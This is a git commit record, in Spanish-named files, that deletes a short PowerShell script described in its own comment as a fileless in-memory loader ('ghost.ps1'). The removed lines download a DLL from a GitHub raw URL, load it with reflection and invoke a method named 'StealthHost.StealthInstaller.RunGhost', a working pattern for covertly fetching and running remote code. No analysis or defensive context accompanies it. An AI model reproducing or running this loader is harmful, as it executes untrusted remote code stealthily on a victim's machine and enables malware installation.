2ea9e046764219995895fc2bfac651a76c20346e
dps <7b1eahh@gmail.com>
2026-03-15 18:35:34 -0300

    Delete Nuevo documento de texto.ps1

--- Nuevo documento de texto.ps1
+++
@@ -1,8 +0,0 @@
-# ghost.ps1 - Carga en RAM absoluta (Fileless)
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sysm.dll"
-$bytes = (New-Object System.Net.WebClient).DownloadData($url)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
-$class = $assembly.GetType("StealthHost.StealthInstaller")
-$method = $class.GetMethod("RunGhost")
-$method.Invoke($null, $null)
